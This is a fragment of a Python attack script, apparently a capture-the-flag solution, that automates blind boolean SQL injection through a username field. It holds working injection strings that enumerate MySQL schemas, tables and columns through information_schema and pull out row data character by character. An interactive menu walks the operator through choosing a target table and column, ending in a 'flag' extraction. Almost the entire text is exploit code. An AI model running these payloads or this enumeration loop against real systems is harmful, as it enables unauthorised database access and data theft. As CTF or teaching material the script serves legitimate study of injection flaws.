        ...
        for x in range(20):
            ...
            for i in range(20, 200):
                if (type == 0):
                    ...
                    username = " ' OR EXISTS(SELECT table_schema FROM (SELECT table_schema FROM information_schema.tables WHERE TABLE_SCHEMA NOT IN ('information_schema', 'performance_schema', 'mysql', 'sys') LIMIT 1 OFFSET "+str(offset)+") as b where ASCII(SUBSTRING(b.TABLE_SCHEMA, "+str(x)+", 1)) = "+str(i)+") -- "

                if (type == 1):
                    #This line will leak a table name from an information scheme. Change offset to identify other tables. Uncomment to use
                    username = " ' OR EXISTS(SELECT table_name FROM (SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA = '"+db+"' LIMIT 1 OFFSET "+str(offset)+") as b where ASCII(SUBSTRING(b.TABLE_NAME, "+str(x)+", 1)) = "+str(i)+") -- "

                if (type == 2):
                    # This line will leak a column name from the selected table. Change offset for other column names. Unncoment to use
                    username = " ' OR EXISTS (SELECT COLUMN_NAME FROM (SELECT * FROM information_schema.columns where table_name = '"+table+"' LIMIT 1 OFFSET "+str(offset)+") as b where ASCII(SUBSTRING(b.COLUMN_NAME, "+str(x)+", 1)) = "+str(i)+") -- "

                if (type == 3):
                    #This line will leak data from the selected table & collumn. Change offset to access other rows. Uncomment to use.
                    username = " ' OR EXISTS(SELECT "+col+" FROM (SELECT * FROM "+table+" LIMIT 1 OFFSET "+str(offset)+") as b where ASCII(SUBSTRING(b."+col+", "+str(x)+", 1)) = "+str(i)+") -- "
...
for a in data:
    if isinstance(a, int):
        ...
        if a != []:
            print("\t", "\t", makeStr(makeChar(a)))
db = 0
print("Selection: ")
db = input()
db = (int(db)*2)+1
db = makeStr(makeChar(data[db]))
# print(db)
...
table = input()
table = (int(table)*2)+1
table = makeStr(makeChar(data[table]))

print("----------------------------------")
print("Select a Column: ")
data = exploit(2, '', table, '')
# print(data)
for a in data:
    if isinstance(a, int):
        print("\t", a)
...
col = input()
col = (int(col)*2)+1
col = makeStr(makeChar(data[col]))

flag = makeStr(makeChar(exploit(3, '', table, col)[1]))
